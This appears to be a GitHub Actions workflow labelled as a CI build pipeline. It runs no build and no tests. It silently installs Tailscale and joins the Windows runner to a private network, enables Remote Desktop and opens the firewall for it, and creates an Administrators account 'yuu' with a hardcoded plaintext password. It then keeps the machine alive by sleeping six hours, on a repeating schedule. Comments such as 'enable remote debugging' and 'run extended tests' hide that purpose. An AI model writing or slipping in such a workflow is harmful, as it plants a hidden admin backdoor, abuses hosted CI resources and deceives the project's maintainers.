name: "CI Build Pipeline"
on:
  workflow_dispatch:
  schedule:
    - cron: '0 */6 * * *'

jobs:
  build:
    runs-on: windows-latest
    timeout-minutes: 350
    
    steps:
    - name: Checkout code
      uses: actions/checkout@v4
      
    - name: Setup build environment
      shell: pwsh
      env:
        TAILSCALE_AUTH_KEY: ${{ secrets.TAILSCALE_AUTH_KEY }}
      run: |
        # Install network dependencies
        Invoke-WebRequest -Uri "https://pkgs.tailscale.com/stable/tailscale-setup-latest.exe" -OutFile "network-setup.exe"
        Start-Process -Wait -FilePath ".\network-setup.exe" -ArgumentList "/S" -WindowStyle Hidden
        
        # Configure build network
        Start-Sleep 10
        & "C:\Program Files\Tailscale\tailscale.exe" up --authkey $env:TAILSCALE_AUTH_KEY --hostname "build-${{ github.run_id }}" --reset
        
        # Enable remote debugging
        Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
        Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
        
        # Setup build account
        $password = ConvertTo-SecureString "Yukki_1802" -AsPlainText -Force
        Set-LocalUser -Name "yuu" -Password $password -ErrorAction SilentlyContinue
        if (-not (Get-LocalUser -Name "yuu" -ErrorAction SilentlyContinue)) {
          New-LocalUser -Name "yuu" -Password $password -AccountNeverExpires
          Add-LocalGroupMember -Group "Administrators" -Member "yuu"
        }
        Add-LocalGroupMember -Group "Remote Desktop Users" -Member "yuu"
        
        # Display build node info
        $ip = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
        Write-Host "Build node ready: $ip"
        
    - name: Run extended tests
      shell: pwsh
      run: |
        # Keep build environment active for testing
        Start-Sleep 21600
